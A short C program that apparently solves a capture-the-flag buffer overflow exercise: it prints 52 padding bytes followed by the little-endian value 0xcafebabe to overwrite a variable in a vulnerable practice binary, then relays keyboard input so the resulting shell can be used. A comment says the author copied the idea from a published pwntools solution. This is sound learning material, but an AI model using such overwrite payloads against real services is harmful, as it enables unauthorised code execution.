#include <stdlib.h>
#include <stdio.h>

char* overflow(void) {
    int length = 13 * 4;
    char* result = (char*)malloc(length + 1); /* +1 for the null-terminator */

    if (result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    for (int i = 0; i < 13 * 4; i++) {
        result[i] = 'x';
    }
    result[length] = '\0'; /* Null-terminate the string */

    return result;
}

int main(int argc, char *argv[])
{
    const char* key = "\xbe\xba\xfe\xca\n";
    printf("%s%s",overflow(),key);
    fflush(stdout);
    char c;

    /* I would have no idea if I haven't watched the solution they were doing it
     * it with a python script but I'll do it like this since I have no idea 
     * about the pwntools library. */
    while ((c = getchar()) != EOF) {
        printf("%c", c);
        fflush(stdout);
    }



    return 0;
}
